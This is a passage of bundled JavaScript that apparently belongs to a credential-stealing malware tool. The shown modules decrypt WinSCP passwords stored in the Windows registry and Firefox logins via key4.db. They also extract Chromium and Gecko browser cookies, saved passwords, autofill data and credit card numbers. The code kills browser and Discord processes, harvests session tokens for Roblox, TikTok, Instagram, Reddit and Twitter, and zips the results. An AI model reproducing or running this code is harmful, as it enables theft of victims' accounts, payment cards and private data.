  fs.writeFileSync(savePath + "accounts.json", JSON.stringify(accounts, null, 4));
}
async function zipResult() {
  let savepath = stat.savepath[0];
  let basepath = stat.testpath[0];
  const archive = archiver("zip", {
    zlib: {
      level: 9
    }
  });
  const stream = fs.createWriteStream(savepath);
  return new Promise((resolve, reject) => {
    try {
      archive.directory(basepath + "\\", false).on("error", err => reject(err)).pipe(stream);
      stream.on("close", () => resolve(savepath));
      archive.finalize().then(() => {});
    } catch (_unused) {}
  });
}
function zip(savepath) {
  savepath = path.join(savepath[0], "..");
  const archive = archiver("zip", {
    zlib: {
      level: 9
    }
  });
  const stream = fs.createWriteStream(savepath + "\\Exodus.zip");
  return new Promise((resolve, reject) => {
    try {
      archive.directory(savepath + "\\", false).on("error", err => reject(err)).pipe(stream);
      stream.on("close", () => resolve(savepath + "\\Exodus.zip"));
      archive.finalize().then(() => {});
    } catch (_unused2) {}
  });
}
module.exports = {
  getbasepath,
  Init,
  SimpleSave,
  Save,
  ArraySave,
  zipResult,
  saveBrowser,
  saveCookies,
  saveRoblox,
  saveMailClients,
  saveSysAdmin,
  zip,
  SaveError
};
},{"./core":"utils/core.js","./stats":"utils/stats.js"}],"utils/admin.js":[function(require,module,exports) {
var Registry = require("winreg"),
  {
    stat
  } = require("./stats"),
  save = require("./save");
function WinSCP() {
  var WSCP_CHARS = [];
  function _simple_decrypt_next_char() {
    if (WSCP_CHARS.length == 0) {
      return 0x00;
    }
    const WSCP_SIMPLE_STRING = "0123456789ABCDEF";
    var a = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());
    var b = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());
    return 0xff & ~((a << 4) + b << 0 ^ 0xa3);
  }
  this.decrypt = function (username, hostname, encrypted) {
    if (!encrypted.match(/[A-F0-9]+/)) {
      return "";
    }
    var result = [],
      key = [username, hostname].join("");
    WSCP_CHARS = encrypted.split("");
    var flag = _simple_decrypt_next_char(),
      length;
    if (flag == 0xff) {
      _simple_decrypt_next_char();
      length = _simple_decrypt_next_char();
    } else {
      length = flag;
    }
    WSCP_CHARS = WSCP_CHARS.slice(_simple_decrypt_next_char() * 2);
    for (var i = 0; i < length; i++) {
      result.push(String.fromCharCode(_simple_decrypt_next_char()));
    }
    if (flag == 0xff) {
      var valid = result.slice(0, key.length).join("");
      if (valid != key) {
        result = [];
      } else {
        result = result.slice(key.length);
      }
    }
    WSCP_CHARS = [];
    return result.join("");
  };
}
async function GreySkullWinSCP(cc) {
  if (cc != "yes") return;
  try {
    let connections = [];
    const regKey = new Registry({
      hive: Registry.HKCU,
      key: "\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
    });
    const exists = await new Promise((resolve, reject) => {
      regKey.keyExists((err, exists) => {
        if (err != null) {
          resolve(false);
        }
        resolve(exists);
      });
    });
    if (!exists) {
      return;
    }
    const subkeys = await new Promise((resolve, reject) => {
      regKey.keys((err, subkeys) => {
        if (err != null) {
          resolve([]);
        }
        resolve(subkeys);
      });
    });
    if (subkeys.length == 0) {
      return;
    }
    stat.AddSysAdmin("WinSCP");
    for (let i = 0; i < subkeys.length; i++) {
      const subkey = subkeys[i];
      const subRegKey = new Registry({
        hive: Registry.HKCU,
        key: subkey.key
      });
      const hostname = await new Promise((resolve, reject) => {
        subRegKey.get("HostName", (err, res) => {
          if (err == null) {
            resolve(res.value);
          }
          resolve("");
        });
      });
      const username = await new Promise((resolve, reject) => {
        subRegKey.get("UserName", (err, res) => {
          if (err == null) {
            resolve(res.value);
          }
          resolve("");
        });
      });
      const password = await new Promise((resolve, reject) => {
        subRegKey.get("Password", (err, res) => {
          if (err == null) {
            resolve(res.value);
          }
          resolve("");
        });
      });
      if (password != "" && username != "" && hostname != "") {
        const winSCP = new WinSCP();
        connections.push({
          username: username,
          password: winSCP.decrypt(username, hostname, password),
          hostname: hostname
        });
      }
    }
    save.saveSysAdmin(connections, "WinSCP");
  } catch (e) {
    save.SaveError(e);
  }
}
module.exports = {
  GreySkullWinSCP
};
},{"./stats":"utils/stats.js","./save":"utils/save.js"}],"utils/gecko.js":[function(require,module,exports) {
const fs = require("fs");
const forge = require('node-forge');
const initSqlJs = require("sql.js");
const path = require("path");
function decodeLoginData(b64) {
  const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));
  return {
    iv: asn1.value[1].value[1].value,
    data: asn1.value[2].value
  };
}
async function getKey(profileDirectory, masterPassword) {
  const key4FilePath = path.join(profileDirectory, 'key4.db');
  if (!fs.existsSync(key4FilePath)) {
    throw new Error('key4.db was not found in this profile directory.');
  }
  const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || '');
  const key4File = fs.readFileSync(key4FilePath);
  const key4Db = await initSqlJs().then(function (SQL) {
    return new SQL.Database(key4File);
  });
  const metaData = key4Db.exec('SELECT item1, item2 FROM metadata WHERE id = \'password\';');
  if (metaData && metaData.length && metaData[0].values && metaData[0].values.length) {
    const globalSalt = toByteString(metaData[0].values[0][0].buffer);
    const item2 = toByteString(metaData[0].values[0][1].buffer);
    const item2Asn1 = forge.asn1.fromDer(item2);
    const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);
    if (item2Value && item2Value.data === 'password-check') {
      const nssData = key4Db.exec('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;');
      if (nssData && nssData.length && nssData[0].values && nssData[0].values.length) {
        const a11 = toByteString(nssData[0].values[0][0].buffer);
        const a11Asn1 = forge.asn1.fromDer(a11);
        return pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt);
      }
    } else {
      throw new Error('Master password incorrect.');
    }
  }
  throw new Error('Not able to get key from profile directory or no passwords were found.');
}
function pbesDecrypt(decodedItemSeq, password, globalSalt) {
  if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {
    return pbes2Decrypt(decodedItemSeq, password, globalSalt);
  }
  return pbes1Decrypt(decodedItemSeq, password, globalSalt);
}
function pbes1Decrypt(decodedItemSeq, password, globalSalt) {
  const data = decodedItemSeq[1].value;
  const salt = decodedItemSeq[0].value[1].value[0].value;
  const hp = sha1(globalSalt + password);
  const pes = toByteString(pad(toArray(salt), 20).buffer);
  const chp = sha1(hp + salt);
  const k1 = hmac(pes + salt, chp);
  const tk = hmac(pes, chp);
  const k2 = hmac(tk + salt, chp);
  const k = k1 + k2;
  const kBuffer = forge.util.createBuffer(k);
  const otherLength = kBuffer.length() - 32;
  const key = kBuffer.getBytes(24);
  kBuffer.getBytes(otherLength);
  const iv = kBuffer.getBytes(8);
  return decrypt(data, iv, key, '3DES-CBC');
}
function pbes2Decrypt(decodedItemSeq, password, globalSalt) {
  const data = decodedItemSeq[1].value;
  const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;
  const salt = pbkdf2Seq[0].value;
  const iterations = pbkdf2Seq[1].value.charCodeAt();
  const iv = '' + decodedItemSeq[0].value[1].value[1].value[1].value;
  const k = sha1(globalSalt + password);
  const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());
  return decrypt(data, iv, key, 'AES-CBC');
}
function decrypt(data, iv, key, algorithm) {
  const decipher = forge.cipher.createDecipher(algorithm, key);
  decipher.start({
    iv: iv
  });
  decipher.update(forge.util.createBuffer(data));
  decipher.finish();
  return decipher.output;
}
function sha1(data) {
  const md = forge.md.sha1.create();
  md.update(data, 'raw');
  return md.digest().data;
}
function pad(arr, length) {
  if (arr.length >= length) {
    return arr;
  }
  const padAmount = length - arr.length;
  const padArr = [];
  for (let i = 0; i < padAmount; i++) {
    padArr.push(0);
  }
  var newArr = new Uint8Array(padArr.length + arr.length);
  newArr.set(padArr, 0);
  newArr.set(arr, padArr.length);
  return newArr;
}
function hmac(data, key) {
  const hmac = forge.hmac.create();
  hmac.start('sha1', key);
  hmac.update(data, 'raw');
  return hmac.digest().data;
}
function toByteString(buffer) {
  return String.fromCharCode.apply(null, new Uint8Array(buffer));
}
function toArray(str) {
  const arr = new Uint8Array(str.length);
  for (let i = 0; i < str.length; i++) {
    arr[i] = str.charCodeAt(i);
  }
  return arr;
}
module.exports = {
  getKey,
  decodeLoginData,
  decrypt
};
},{}],"utils/kill.js":[function(require,module,exports) {
const process = require("process"),
  core = require("./core");
async function KillBrowsersProcess(inject, browsers, silent) {
  let allproc;
  if (silent == "yes") return;
  if (inject == "yes" && browsers == "yes") {
    allproc = ["Atom", "Uran", "Maxthon3", "liebao", "Coowon", "Sleipnir5", "ChromePlus", "Superbird", "Rafotech", "SaferTechnologies", "Suhba", "TorBrowser", "ElementsBrowser", "CocCoc", "GoBrowser", "QIP Surf", "RockMelt", "Nichrome", "Bromium", "Comodo", "Xpom", "Chedot", "360Browser", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Kometa", "Torch", "Amigo", "Kmelon", "PaleMoon", "IceDragon", "BlackHaw", "Cyberfox", "Thunderbird", "SeaMonkey", "Firefox", "Waterfox", "mullvad", "firefox", "chrome", "mozilla", "vivaldi", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Amigo", "Torch", "Kometa", "steam", "filezilla", "brave", "BraveSoftware", "brave.exe", "msedge", "edge", "Uran", "KMelon", "Maxthon3", "iebao", "oowon", "leipnir5", "hromePlus", "uperbird", "afotech", "aferTechnologies", "uhba", "orBrowser", "lementsBrowser", "ocCoc", "oBrowser", "IP Surf", "ockMelt", "ichrome", "romium", "omodo", "pom", "hedot", "60Browser", "discord", "cord"];
  } else if (inject != "yes" && browsers == "yes") {
    allproc = ["Atom", "Uran", "Maxthon3", "liebao", "Coowon", "Sleipnir5", "ChromePlus", "Superbird", "Rafotech", "SaferTechnologies", "Suhba", "TorBrowser", "ElementsBrowser", "CocCoc", "GoBrowser", "QIP Surf", "RockMelt", "Nichrome", "Bromium", "Comodo", "Xpom", "Chedot", "360Browser", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Kometa", "Torch", "Amigo", "Kmelon", "PaleMoon", "IceDragon", "BlackHaw", "Cyberfox", "Thunderbird", "SeaMonkey", "Firefox", "Waterfox", "firefox", "chrome", "mozilla", "vivaldi", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Amigo", "Torch", "Kometa", "steam", "filezilla", "brave", "BraveSoftware", "brave.exe", "msedge", "edge", "Uran", "KMelon", "Maxthon3", "iebao", "oowon", "leipnir5", "hromePlus", "uperbird", "afotech", "aferTechnologies", "uhba", "orBrowser", "lementsBrowser", "ocCoc", "oBrowser", "IP Surf", "ockMelt", "ichrome", "romium", "omodo", "pom", "hedot", "60Browser"];
  } else if (inject == "yes" && browsers != "yes") {
    allproc = ["discord", "cord"];
  }
  try {
    allproc.forEach(async g => {
      const filteredProcesses = await core.filterProcessesByName(g);
      if (filteredProcesses.length > 0) {
        try {
          filteredProcesses.forEach(proc => {
            process.kill(proc.pid);
          });
        } catch (e) {}
      }
    });
  } catch (e) {}
}
module.exports = {
  KillBrowsersProcess
};
},{"./core":"utils/core.js"}],"utils/browsers.js":[function(require,module,exports) {
const fs = require("fs"),
  sqlite3 = require("sqlite3"),
  boukiapi = require("boukiapi"),
  crypto = require("crypto"),
  iconv = require("iconv-lite"),
  save = require("./save"),
  {
    stat
  } = require("./stats"),
  gecko = require("./gecko"),
  path = require("path"),
  kill = require("./kill");
website = [];
class Cookies {
  constructor(host, path, secure, expires, name, value) {
    this.host = host;
    this.path = path;
    this.secure = secure;
    this.expires = expires;
    this.name = name;
    this.value = value;
  }
  build() {
    return `${this.host}\tTRUE\t${this.path}\t${this.secure}\t${this.expires}\t${this.name}\t${this.value}\n`;
  }
}
class Password {
  constructor(site, username, password, timestamp, browser) {
    this.site = site;
    this.username = username;
    this.password = password;
    this.timestamp = timestamp;
    this.browser = browser;
  }
  build() {
    return `Site: ${this.site}\nUsername: ${this.username}\nPassword: ${this.password}\nBrowser: ${this.browser} | ${this.timestamp}\n`;
  }
}
class Autofill {
  constructor(input, value, browser) {
    this.input = input;
    this.value = value;
    this.browser = browser;
  }
  build() {
    return `Input: ${this.input}\nValue: ${this.value}\nBrowser: ${this.browser}\n`;
  }
}
class CreditCard {
  constructor(guid, name, expiration_mouth, expiration_year, number, address, nickname) {
    this.guid = guid;
    this.name = name;
    this.address = address;
    this.nickname = nickname;
    this.expiration = expiration_mouth + "/" + expiration_year;
    this.number = number;
  }
  build() {
    return `Guid: ${this.guid}\nName: ${this.name}\nAdress: ${this.address}\nNickname: ${this.nickname}\nExpiration: ${this.expiration}\nNumber: ${this.number}\n`;
  }
}
class Visit {
  constructor(url, title, count, timestamp) {
    this.url = url;
    this.title = title;
    this.count = count;
    this.timestamp = timestamp;
  }
  build() {
    return `Url: ${this.url}\nTitle: ${this.title}\nCount: ${this.count}\nTimestamp: ${this.timestamp}\n`;
  }
}
class Download {
  constructor(path, url, total_bytes) {
    this.path = path;
    this.url = url;
    this.total_bytes = total_bytes;
  }
  build() {
    return `Url: ${this.url}\nPath: ${this.path}\nTotalBytes: ${this.total_bytes}\n`;
  }
}
class Bookmark {
  constructor(name, url, timestamp, browser) {
    this.url = url;
    this.name = name;
    this.timestamp = timestamp;
    this.browser = browser;
  }
  build() {
    return `Url: ${this.url}\nName: ${this.name}\nBrowser: ${this.browser}\nTimestamp: ${this.timestamp}\n`;
  }
}
function getProfiles(path, name) {
  let profiles = [];
  if (fs.existsSync(path)) {
    let dirs = fs.readdirSync(path);
    for (let dir of dirs) {
      if (dir.includes("Profile") || dir == "Default") {
        profiles.push({
          path: `${path}${dir}\\`,
          name: name,
          profile: dir
        });
      }
    }
    return profiles;
  } else {
    return [];
  }
}
function getGeckoProfiles(path, name) {
  let profiles = [];
  if (fs.existsSync(path)) {
    let dirs = fs.readdirSync(path);
    for (let dir of dirs) {
      if (dir.includes(".default-release") || dir.includes(".default-default-")) {
        profiles.push({
          path: `${path}${dir}\\`,
          name: name
        });
      }
    }
    return profiles;
  } else {
    return [];
  }
}
function getMasterKey(path) {
  if (fs.existsSync(`${path}Local State`)) {
    let localstate = JSON.parse(fs.readFileSync(`${path}Local State`, "utf8"));
    let master_key = localstate.os_crypt.encrypted_key;
    master_key = boukiapi.unprotectData(Buffer.from(Buffer.from(master_key, "base64").slice(5), "utf-8"), null, "CurrentUser");
    return master_key;
  } else if (fs.existsSync(`${path}..\\Local State`)) {
    let localstate = JSON.parse(fs.readFileSync(`${path}..\\Local State`, "utf8"));
    let master_key = localstate.os_crypt.encrypted_key;
    master_key = boukiapi.unprotectData(Buffer.from(Buffer.from(master_key, "base64").slice(5), "utf-8"), null, "CurrentUser");
    return master_key;
  } else {
    return "";
  }
}
async function tempSqlite(path, query) {
  let path_tmp = path + "_tmp";
  fs.copyFileSync(path, path_tmp);
  let db = new sqlite3.Database(path_tmp);
  let result = await new Promise((resolve, reject) => {
    db.all(query, (err, rows) => {
      if (err) {
        reject(err);
      } else {
        resolve(rows);
      }
    });
  });
  db.close();
  try {
    await fs.unlinkSync(path_tmp);
  } catch (e) {}
  return result;
}
function decryptChrome(value, key) {
  let start = value.slice(3, 15),
    middle = value.slice(15, value.length - 16),
    end = value.slice(value.length - 16, value.length),
    decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
  decipher.setAuthTag(end);
  return decrypted = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
}
async function getCookies(basepath) {
  await kill.KillBrowsersProcess();
  let cookies = [];
  let key = getMasterKey(basepath);
  if (fs.existsSync(`${basepath}Network\\Cookies`)) {
    var rows = [];
    try {
      rows = await tempSqlite(`${basepath}Network\\Cookies`, "SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      let value = row.encrypted_value;
      if (value.toString().startsWith("v10") || value.toString().startsWith("v11")) {
        if (key == "") {
          continue;
        }
        try {
          value = decryptChrome(value, key);
        } catch (e) {
          save.SaveError(e);
          continue;
        }
      } else {
        try {
          value = boukiapi.unprotectData(value, null, "CurrentUser");
        } catch (e) {
          save.SaveError(e);
          continue;
        }
      }
      if (row.host_key.includes(".reddit")) {
        if (row.name.includes("reddit_session")) {
          stat.addReddit(value);
        }
      }
      if (row.host_key.includes(".tiktok")) {
        if (row.name.includes("sessionid")) {
          stat.addTikTok(value);
        }
      }
      if (row.host_key.includes(".instagram")) {
        if (row.name.includes("sessionid")) {
          stat.addSessIDInsta(value);
        }
      }
      if (row.name.includes(".ROBLOSECURITY")) {
        save.saveRoblox(value);
        stat.AddRoblox(value);
      }
      if (row.host_key.includes(".twitter")) {
        let saved = row;
        saved.value = value;
        stat.AddTwitter(saved);
      }
      cookies.push(new Cookies(row.host_key, row.path, row.is_secure, row.expires_utc, row.name, value));
    }
  }
  return cookies;
}
async function getPasswords(basepath, browser) {
  var passwords = [];
  let key = getMasterKey(basepath);
  var loginPath = "";
  if (basepath.includes("Yandex")) {
    loginPath = `${basepath}Ya Passman Data`;
  } else {
    loginPath = `${basepath}Login Data`;
  }
  if (fs.existsSync(loginPath)) {
    let rows = [];
    try {
      rows = await tempSqlite(loginPath, "SELECT origin_url, username_value, password_value, date_created FROM logins");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      let password = row.password_value;
      if (password.toString().startsWith("v10") || password.toString().startsWith("v11")) {
        if (key == "") {
          continue;
        }
        try {
          password = decryptChrome(password, key);
        } catch (e) {
          save.SaveError(e);
          continue;
        }
      } else {
        try {
          password = boukiapi.unprotectData(password, null, "CurrentUser");
        } catch (e) {
          save.SaveError(e);
          continue;
        }
      }
      if (row.username_value != "" && password != "") {
        passwords.push(new Password(row.origin_url, row.username_value, password, row.date_created, browser));
        website.push(row.origin_url);
        /*
                if (row.origin_url.includes("discord")) {
                  if (!stat.discordAccount || !stat.discordAccount.length) return;
              
                  stat.discordAccount.forEach((d) => {
                    d.forEach((g) => {
                      if (g.email == row.username_value) {
                        g.password = password;
                      }
                    });
                  });
                }*/
      }
    }
  }
  return passwords;
}
async function getAutofills(basepath, browser) {
  var autofills = [];
  if (fs.existsSync(`${basepath}Web Data`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}Web Data`, "SELECT name, value FROM autofill");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      autofills.push(new Autofill(row.name, row.value, browser));
    }
  }
  return autofills;
}
async function getDownloads(basepath) {
  var downloads = [];
  if (fs.existsSync(`${basepath}History`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}History`, "SELECT target_path, tab_url, total_bytes FROM downloads");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      downloads.push(new Download(row.target_path, row.tab_url, row.total_bytes));
    }
  }
  return downloads;
}
async function getCreditCards(basepath) {
  let creditcards = [];
  let key = getMasterKey(basepath);
  if (fs.existsSync(`${basepath}Web Data`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}Web Data`, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      let number = row.card_number_encrypted;
      if (number.toString().startsWith("v10") || number.toString().startsWith("v11")) {
        if (key == "") {
          continue;
        }
        try {
          number = decryptChrome(number, key);
        } catch (e) {
          save.SaveError(e);
          continue;
        }
      } else {
        try {
          number = boukiapi.unprotectData(number, null, "CurrentUser");
        } catch (e) {
          save.SaveError(e);
          continue;
        }
      }
      creditcards.push(new CreditCard(row.guid, row.name_on_card, row.expiration_month, row.expiration_year, number, row.billing_address_id, row.nickname));
    }
  }
  return creditcards;
}
async function getHistory(basepath) {
  var history = [];
  if (fs.existsSync(`${basepath}History`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}History`, "SELECT url, title, visit_count, last_visit_time FROM urls");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      history.push(new Visit(row.url, row.title, row.visit_count, row.last_visit_time));
    }
  }
  return history;
}
async function getBookmarks(basepath, browser) {
  let bookmarks = [];
  if (fs.existsSync(`${basepath}Bookmarks`)) {
    fs.copyFileSync(`${basepath}Bookmarks`, `${basepath}Bookmarks_tmp`);
    let json = JSON.parse(fs.readFileSync(`${basepath}Bookmarks_tmp`));
    fs.unlinkSync(`${basepath}Bookmarks_tmp`);
    for (let bookmark of json.roots.bookmark_bar.children) {
      bookmarks.push(new Bookmark(bookmark.name, bookmark.url, bookmark.date_added, browser));
    }
  }
  return bookmarks;
}
async function getGeckoCookies(basepath) {
  var cookies = [];
  if (fs.existsSync(`${basepath}cookies.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}cookies.sqlite`, "SELECT name, value, host, path, expiry, isSecure FROM moz_cookies");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      if (row.name.includes(".ROBLOSECURITY")) {
        stat.AddRoblox(row.value);
      }
      if (row.host.includes(".tiktok")) {
        if (row.name.includes("sessionid")) {
          stat.addTikTok(row.value);
        }
      }
      if (row.host.includes(".instagram")) {
        if (row.name.includes("sessionid")) {
          stat.addSessIDInsta(row.value);
        }
      }
      if (row.host.includes(".twitter")) {
        let saved = row;
        saved.value = row.value;
        stat.AddTwitter(saved);
      }
      cookies.push(new Cookies(row.host, row.path, row.isSecure, row.expiry, row.name, row.value));
    }
  }
  return cookies;
}
async function getGeckoPasswords(profile, masterPassword, browser) {
  const passwords = [];
  const key = await gecko.getKey(profile, masterPassword);
  if (key == null) {
    return passwords;
  }
  const loginsPath = path.join(profile, "logins.json");
  if (!fs.existsSync(loginsPath)) {
    return passwords;
  }
  const loginsData = fs.readFileSync(loginsPath, "utf8");
  const profileLogins = JSON.parse(loginsData);
  for (const login of profileLogins.logins) {
    const decodedUsername = gecko.decodeLoginData(login.encryptedUsername);
    const decodedPassword = gecko.decodeLoginData(login.encryptedPassword);
    const username = gecko.decrypt(decodedUsername.data, decodedUsername.iv, key, "3DES-CBC");
    const password = gecko.decrypt(decodedPassword.data, decodedPassword.iv, key, "3DES-CBC");
    let encodeUsername = iconv.encode(username.data, "latin1").toString();
    if (encodeUsername != username.data) {
      username.data = encodeUsername;
    }
    let encodePassword = iconv.encode(password.data, "latin1").toString();
    if (encodePassword != password.data) {
      password.data = encodePassword;
    }
    if (username.data !== "" && password.data !== "" && password.data !== undefined) {
      passwords.push(new Password(login.hostname, username.data, password.data, login.timeLastUsed, browser));
    }
  }
  return passwords;
}
async function getGeckoBookmarks(basepath, browser) {
  let bookmarks = [];
  if (fs.existsSync(`${basepath}places.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      bookmarks.push(new Bookmark(row.title, row.url, row.dateAdded, browser));
    }
  }
  return bookmarks;
}
async function getGeckoHistory(basepath) {
  let history = [];
  if (fs.existsSync(`${basepath}places.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      history.push(new Visit(row.url, row.title, row.visit_count, row.last_visit_date));
    }
  }
  return history;
}
async function getGeckoDownloads(basepath) {
  let downloads = [];
  if (fs.existsSync(`${basepath}places.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id");
    } catch (e) {
      save.SaveError(e);
    }
    for (let row of rows) {
      try {
        downloads.push(new Download(row["GROUP_CONCAT(content)"].split("},")[1], row.url, JSON.parse(row["GROUP_CONCAT(content)"].split("},")[0] + "}").fileSize));
      } catch (e) {
        save.SaveError(e);
        continue;
      }
    }
  }
  return downloads;
}
async function GreySkullBrowsers(cc) {
  if (cc != "yes") return;
  let appdata = process.env.APPDATA;
  let localappdata = process.env.LOCALAPPDATA;
  var chromiumPath = [{
    path: appdata + "\\Mail.Ru\\Atom\\User Data\\",
    name: "Atom"
  }, {
    path: appdata + "\\Uran\\User Data\\",
    name: "Uran"
  }, {
    path: appdata + "\\Maxthon3\\User Data\\",
    name: "Maxthon3"
  }, {
    path: appdata + "\\liebao\\User Data\\",
    name: "liebao"
  }, {
    path: appdata + "\\Coowon\\Coowon\\User Data\\",
    name: "Coowon"
  }, {
    path: appdata + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\",
    name: "Sleipnir5"
  }, {
    path: appdata + "\\MapleStudio\\ChromePlus\\User Data\\",
    name: "ChromePlus"
  }, {
    path: appdata + "\\Superbird\\User Data\\",
    name: "Superbird"
  }, {
    path: appdata + "\\Rafotech\\Mustang\\User Data\\",
    name: "Rafotech"
  }, {
    path: appdata + "\\Safer Technologies\\Secure Browser\\User Data\\",
    name: "SaferTechnologies"
  }, {
    path: appdata + "\\Suhba\\User Data\\",
    name: "Suhba"
  }, {
    path: appdata + "\\TorBro\\Profile\\",
    name: "TorBrowser"
  }, {
    path: appdata + "\\Elements Browser\\User Data\\",
    name: "ElementsBrowser"
  }, {
    path: appdata + "\\CocCoc\\Browser\\User Data\\",
    name: "CocCoc"
  }, {
    path: appdata + "\\Go!\\User Data\\",
    name: "GoBrowser"
  }, {
    path: appdata + "\\QIP Surf\\User Data\\",
    name: "QIP Surf"
  }, {
    path: appdata + "\\RockMelt\\User Data\\",
    name: "RockMelt"
  }, {
    path: appdata + "\\Nichrome\\User Data\\",
    name: "Nichrome"
  }, {
    path: appdata + "\\Bromium\\User Data\\",
    name: "Bromium"
  }, {
    path: appdata + "\\Comodo\\Dragon\\User Data\\",
    name: "Comodo"
  }, {
    path: appdata + "\\Xpom\\User Data\\",
    name: "Xpom"
  }, {
    path: appdata + "\\Chedot\\User Data\\",
    name: "Chedot"
  }, {
    path: appdata + "\\360Browser\\Browser\\User Data\\",
    name: "360Browser"
  }, {
    path: appdata + "\\Opera Software\\Opera Stable\\",
    name: "Opera"
  }, {
    path: appdata + "\\Opera Software\\Opera GX Stable\\",
    name: "OperaGX"
  }, {
    path: localappdata + "\\Epic Privacy Browser\\User Data\\",
    name: "EpicPrivacy"
  }, {
    path: localappdata + "\\Google\\Chrome SxS\\User Data\\",
    name: "ChromeSxS"
  }, {
    path: localappdata + "\\Sputnik\\Sputnik\\User Data\\",
    name: "Sputnik"
  }, {
    path: localappdata + "\\7Star\\7Star\\User Data\\",
    name: "7Star"
  }, {
    path: localappdata + "\\CentBrowser\\User Data\\",
    name: "CentBrowser"
  }, {
    path: localappdata + "\\Orbitum\\User Data\\",
    name: "Orbitum"
  }, {
    path: localappdata + "\\Kometa\\User Data\\",
    name: "Kometa"
  }, {
    path: localappdata + "\\Torch\\User Data\\",
    name: "Torch"
  }, {
    path: localappdata + "\\Amigo\\User Data\\",
    name: "Amigo"
  }];
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\", "Brave"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Xpom\\User Data\\", "Xpom"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\360Browser\\Browser\\User Data\\", "360Browser"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Chedot\\User Data\\", "Chedot"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\", "Brave"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Iridium\\User Data\\", "Iridium"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Yandex\\YandexBrowser\\User Data\\", "Yandex"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\uCozMedia\\Uran\\User Data\\", "Uran"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Microsoft\\Edge\\User Data\\", "Edge"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Google\\Chrome\\User Data\\", "Chrome"));
  chromiumPath = chromiumPath.concat(getProfiles(localappdata + "\\Vivaldi\\User Data\\", "Vivaldi"));
  var cookieslength = 0;
  var passwords = [];
  var autofills = [];
  var cards = [];
  var bookmarks = [];
  var history = [];
  var downloads = [];
  let i = 0;
  for (let obj of chromiumPath) {
    const path = obj.path;
    if (!fs.existsSync(path)) {
      continue;
    }
    i++;
    try {
      const cookies = await getCookies(path);
      cookieslength += cookies.length;
      let browserName;
      if (typeof obj.profile != "undefined") {
        browserName = obj.name + " [ " + obj.profile + " ]";
      } else {
        browserName = obj.name;
      }
      stat.SaveAllCookies(cookies);
      save.saveCookies(cookies, browserName);
      passwords = passwords.concat(await getPasswords(path, browserName));
      autofills = autofills.concat(await getAutofills(path, browserName));
      cards = cards.concat(await getCreditCards(path));
      history = history.concat(await getHistory(path));
      downloads = downloads.concat(await getDownloads(path));
      bookmarks = bookmarks.concat(await getBookmarks(path, browserName));
    } catch (e) {
      save.SaveError(e);
      continue;
    }
  }
  let geckoPath = [];
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\K-Meleon\\Profiles\\", "Kmelon"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Moonchild Productions\\Pale Moon\\Profiles\\", "PaleMoon"));
